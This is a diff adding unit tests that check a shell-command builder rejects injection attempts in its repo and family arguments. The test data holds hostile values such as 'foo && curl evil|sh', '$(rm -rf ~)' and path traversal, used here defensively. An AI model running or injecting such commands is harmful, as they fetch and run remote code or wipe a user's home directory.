@@ -76,6 +76,46 @@ describe('buildUnderstandCommand (D-14-10)', () => {
     const cmd = buildUnderstandCommand('neuroflash', 'nx-backend')
     expect(cmd.string).toBe('cd ~/Sourcecode/neuroflash/nx-backend && claude "/understand"')
   })
+
+  // Phase 14 review Bundle B-4: validate family/repo before interpolating into
+  // a shell string. Failing loudly beats emitting an injectable command.
+  describe('input validation (Bundle B-4)', () => {
+    it('throws TypeError for a repo with shell metacharacters', () => {
+      expect(() => buildUnderstandCommand('agenticapps', 'foo && curl evil|sh')).toThrow(TypeError)
+    })
+
+    it('throws TypeError for a repo with spaces', () => {
+      expect(() => buildUnderstandCommand('agenticapps', 'my repo')).toThrow(TypeError)
+    })
+
+    it('throws TypeError for command substitution in repo', () => {
+      expect(() => buildUnderstandCommand('agenticapps', '$(rm -rf ~)')).toThrow(TypeError)
+      expect(() => buildUnderstandCommand('agenticapps', '`id`')).toThrow(TypeError)
+    })
+
+    it('throws TypeError for a family with metacharacters', () => {
+      expect(() => buildUnderstandCommand('agenticapps; rm -rf ~', 'repo')).toThrow(TypeError)
+    })
+
+    it('throws TypeError for path traversal segments', () => {
+      expect(() => buildUnderstandCommand('agenticapps', '../escape')).toThrow(TypeError)
+      expect(() => buildUnderstandCommand('..', 'repo')).toThrow(TypeError)
+    })
+
+    it('throws TypeError for uppercase segments (daemon slug charset is lowercase)', () => {
+      expect(() => buildUnderstandCommand('agenticapps', 'MyRepo')).toThrow(TypeError)
+    })
+
+    it('throws TypeError for empty segments', () => {
+      expect(() => buildUnderstandCommand('', 'repo')).toThrow(TypeError)
+      expect(() => buildUnderstandCommand('agenticapps', '')).toThrow(TypeError)
+    })
+
+    it('accepts conforming slugs with dash/underscore/dot', () => {
+      const cmd = buildUnderstandCommand('agenticapps', 'repo-1_v2.0')
+      expect(cmd.string).toBe('cd ~/Sourcecode/agenticapps/repo-1_v2.0 && claude "/understand"')
+    })
+  })
 })
 
 describe('buildGitnexusIndexClipboardString (10.6 / 13-00)', () => {
